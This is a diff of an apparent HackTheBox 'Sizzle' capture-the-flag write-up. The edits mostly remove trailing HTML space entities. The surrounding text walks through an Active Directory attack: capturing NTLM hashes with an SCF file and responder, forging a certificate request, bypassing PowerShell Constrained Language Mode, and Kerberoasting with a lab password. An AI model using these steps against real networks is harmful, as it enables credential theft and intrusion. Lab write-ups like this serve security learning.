@@ -1,6 +1,6 @@
 # Sizzle
 
-## Amanda Shell&#x20;
+## Amanda Shell
 
 Nmap scan:
 
@@ -60,7 +60,7 @@ ftp> ls
 226 Transfer complete.
 ```
 
-Let's move on for now, we might need this later.&#x20;
+Let's move on for now, we might need this later.
 
 ### HTTP
 
@@ -156,7 +156,7 @@ The `Users` directory gives me a list of usernames to work with and perhaps ASRE
   Public                              D        0  Wed Sep 26 01:45:32 2018
 ```
 
-The `ZZ_Archive` directory contains a lot of different files which all have the same size and edit date with different extensions.&#x20;
+The `ZZ_Archive` directory contains a lot of different files which all have the same size and edit date with different extensions.
 
 ```
 smb: \ZZ_ARCHIVE\> ls
@@ -177,7 +177,7 @@ All of these folders were rather useless and contained nothing of interest. I tr
 
 In another machine [Driver ](https://rouvin.gitbook.io/ibreakstuff/writeups/hackthebox/easy/drive)on HTB, we had to create a `.scf` file that was being clicked by the user in order to capture NTLM hashes via `responder`. I tried the same thing here.
 
-First, I mounted the SMB share.&#x20;
+First, I mounted the SMB share.
 
 ```
 $ sudo mount -t cifs '//10.129.73.156/Department Shares' ~/htb/sizzle/mnt
@@ -287,7 +287,7 @@ For some reason, I cannot specify the key strength in this, so we probably aren'
 
 <figure><img src="../../../.gitbook/assets/image (614).png" alt=""><figcaption></figcaption></figure>
 
-It appears we have to create a certificate ourselves, then use it to submit a request to be approved. I know that certificates can be used for authentication purposes, and this service is used to signed the certificates to 'make them legit'. As such, we can create a Certificate Signing Request (CSR) via `openssl`.&#x20;
+It appears we have to create a certificate ourselves, then use it to submit a request to be approved. I know that certificates can be used for authentication purposes, and this service is used to signed the certificates to 'make them legit'. As such, we can create a Certificate Signing Request (CSR) via `openssl`.
 
 ```bash
 $ openssl req -new -newkey rsa:2048 -nodes -keyout user.key -out user.csr
@@ -311,9 +311,9 @@ Using this, we can get a shell as Amanda:
 
 ## Privilege Escalation
 
-### Bloodhound -> Kerberoastable&#x20;
+### Bloodhound -> Kerberoastable
 
-Before starting my enumeration within the machine, we can use `bloodhound-python` to scope what we need to do (else we'll be heading in blind).&#x20;
+Before starting my enumeration within the machine, we can use `bloodhound-python` to scope what we need to do (else we'll be heading in blind).
 
 ```bash
 $ bloodhound-python -d HTB.local -u amanda -p Ashare1972 -c all -ns 10.129.101.141
@@ -327,7 +327,7 @@ Checking the privileges of this user, we can see that they have DCSync privilege
 
 <figure><img src="../../../.gitbook/assets/image (2455).png" alt=""><figcaption></figcaption></figure>
 
-So that's the attack path. Normally, I would aim to Kerberoast remotely for both OPSEC reasons and also because `impacket` is just so easy to use. However, in our initial `nmap` scan, port 88 is not public facing. This means that we **have** to Kerberoast on the machine itself using `rubeus.exe`.&#x20;
+So that's the attack path. Normally, I would aim to Kerberoast remotely for both OPSEC reasons and also because `impacket` is just so easy to use. However, in our initial `nmap` scan, port 88 is not public facing. This means that we **have** to Kerberoast on the machine itself using `rubeus.exe`.
 
 ### CLM + AppLocker -> CLM Bypass
 
@@ -342,7 +342,7 @@ PS > $ExecutionContext.SessionState.LanguageMode
 ConstrainedLanguage
 ```
 
-There are 2 methods of exploitation here. One is we could run a Kerberoast Powershell script that would involve bypassing CLM. Fortunately, iRedTeam has a whole article detailing a method that involves Powershell versions.&#x20;
+There are 2 methods of exploitation here. One is we could run a Kerberoast Powershell script that would involve bypassing CLM. Fortunately, iRedTeam has a whole article detailing a method that involves Powershell versions.
 
 {% embed url="https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass" %}
 
@@ -358,11 +358,11 @@ powershell -version 2 -nop -nop -noexit -exec bypass -c '.\shell.ps1'
 
 <figure><img src="../../../.gitbook/assets/image (3860).png" alt=""><figcaption></figcaption></figure>
 
-Great! Now we have a fully functioning shell.&#x20;
+Great! Now we have a fully functioning shell.
 
 ### Invoke-Kerberoast
 
-Since we have a full shell, we don't actually need Rubeus anymore as there are plenty of Kerberoasting Powershell scripts that (hopefully) don't trigger AppLocker.&#x20;
+Since we have a full shell, we don't actually need Rubeus anymore as there are plenty of Kerberoasting Powershell scripts that (hopefully) don't trigger AppLocker.
 
 However, trying to run this gives me a weird error:
 
@@ -381,7 +381,7 @@ At C:\Users\amanda\Documents\shell.ps1:127 char:21
 ```
 {% endcode %}
 
-We can follow the PowerSploit documentation to resolve this.&#x20;
+We can follow the PowerSploit documentation to resolve this.
 
 ```powershell
 $SecPassword = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force
